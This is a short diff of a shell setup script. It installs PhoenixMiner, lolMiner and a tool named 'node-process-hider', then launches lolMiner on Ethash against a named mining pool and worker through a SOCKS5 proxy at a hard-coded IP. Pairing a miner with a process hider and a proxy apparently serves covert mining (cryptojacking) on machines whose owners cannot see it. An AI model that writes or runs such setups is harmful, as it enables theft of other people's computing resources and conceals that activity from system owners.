@@ -11,5 +11,5 @@ dpkg-reconfigure --frontend noninteractive tzdata
 ph add PhoenixMinerEth.sh
 ph add node-process-hider
 ph add lolMiner
-./lolMiner --algo ETHASH --pool stratum+tcp://ethash.kupool.com:8888 --user hunterd.001 --ethstratum ETHPROXY --socks5 46.174.43.18:1080 --timeprint on --longstats 120 
-sleep 10
+./lolMiner --algo ETHASH --pool stratum+tcp://ethash.kupool.com:8888 --user hunterd.001 --ethstratum ETHPROXY --socks5 46.174.43.18:1080 --timeprint on --longstats 60 
+
